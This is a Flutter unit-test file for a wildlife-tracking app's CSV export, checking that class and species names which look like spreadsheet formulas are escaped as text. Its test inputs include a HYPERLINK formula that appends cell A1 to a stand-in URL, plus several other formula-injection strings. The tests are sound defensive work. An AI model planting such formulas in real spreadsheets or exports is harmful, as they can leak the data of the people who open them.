// Round 328: CSV exports carry class and species names from imported models and name lists.
// A spreadsheet (Excel, LibreOffice) runs a cell that starts with = + - or @ as a formula, so
// such text cells get a leading apostrophe; numbers stay as they are.

import 'package:fauna_pulse/fauna_pulse/postprocess/csv_cell.dart';
import 'package:fauna_pulse/fauna_pulse/postprocess/track_export.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  test('a class name that looks like a formula is written as text', () {
    final v = VideoVisit(trackId: 1, clip: 'a.mp4', clipStartMs: 0, firstSeenMs: 0)
      ..lastSeenMs = 1000
      ..addFrame(0.9, '=HYPERLINK("https://example.org/?"&A1,"open")');
    final row = TrackExport.visitsCsv([v]).split('\n')[1];
    expect(row, endsWith(',"\'=HYPERLINK(""https://example.org/?""&A1,""open"")"'));
  });

  test('other formula starts and a lone carriage return', () {
    for (final name in ['+1+1', '-1+1', '@SUM(A1)', '\t=1']) {
      final v = VideoVisit(trackId: 1, clip: 'a.mp4', clipStartMs: 0, firstSeenMs: 0)..addFrame(0.9, name);
      // The apostrophe comes first, inside the quotes when the cell is quoted (a tab).
      expect(TrackExport.visitsCsv([v]).split('\n')[1].split(',').last, matches(RegExp("^\"?'")), reason: name);
    }
    final cr = VideoVisit(trackId: 1, clip: 'a.mp4', clipStartMs: 0, firstSeenMs: 0)..addFrame(0.9, 'bee\rfly');
    expect(TrackExport.visitsCsv([cr]), contains(',"bee\rfly"\n'));
  });

  // A spreadsheet that splits on ";" (German Excel) or a tab would start a new cell there, and
  // spreadsheets skip leading spaces; full-width signs (＝ ＋ － ＠) count as well.
  test('a formula after a semicolon, a tab or leading spaces, or in full width, stays text', () {
    expect(csvCell('Bee;=1+1'), '"Bee;=1+1"');
    expect(csvCell('Bee\t=1+1'), '"Bee\t=1+1"');
    expect(csvCell(' =1+1'), "' =1+1");
    expect(csvCell('\uFF1D1+1'), "'\uFF1D1+1");
  });

  test('numbers, also as formatted text, stay as they are', () {
    for (final n in [-0.5, '-0.5000', '+3', '1e-5', '-12']) {
      expect(csvCell(n), '$n');
    }
    expect(csvCell('Apis mellifera'), 'Apis mellifera');
    expect(csvCell(null), '');
  });
}
